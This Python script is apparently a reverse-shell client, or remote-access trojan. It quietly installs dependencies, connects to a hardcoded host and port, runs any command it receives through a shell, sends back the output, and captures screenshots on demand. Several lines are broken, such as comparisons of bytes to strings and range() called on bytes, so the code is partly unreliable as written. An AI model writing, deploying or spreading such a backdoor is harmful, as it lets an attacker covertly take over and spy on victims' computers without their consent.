'''importing modules'''
import sys , os ,time
try:
    import subprocess
    import pyautogui
    import tqdm
except:
    os.system("pip install subprocess > install.txt")
    os.system("pip install pyautogui > install.txt")
    os.system("pip install tqdm > install.txt")
    os.system("rm install.txt")
    import subprocess
    import pyautogui
    import tqdm
'''seting variables'''
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.110"
port = 5050
SEPARATOR = "<SEPARATOR>"

'''starting connecting to the server'''
s.connect((host ,port))

'''sending info'''
def recv_cammand():
    while True:
        data = s.recv(1024)
        if data[0:] == "cd":
            os.chdir(data[2:].encode("utf-8"))
        elif data[0] == "screenshot":
            for i in range(data[2:].encode("utf-8")):
                screenshot = pyautogui.screenshot()
                img = screenshot.save(f"target{i}.png")
                img_size = os.path.getsize(img)
                s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8"))
        if len(data) > 0:
            terminal = subprocess.Popen(data[:].encode("utf-8"), shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bite = terminal.stdout.read() + terminal.stderr.read()
            output_str = str(output_bite,"utf-8")
            s.send(str.encode(output_str))
    s.close()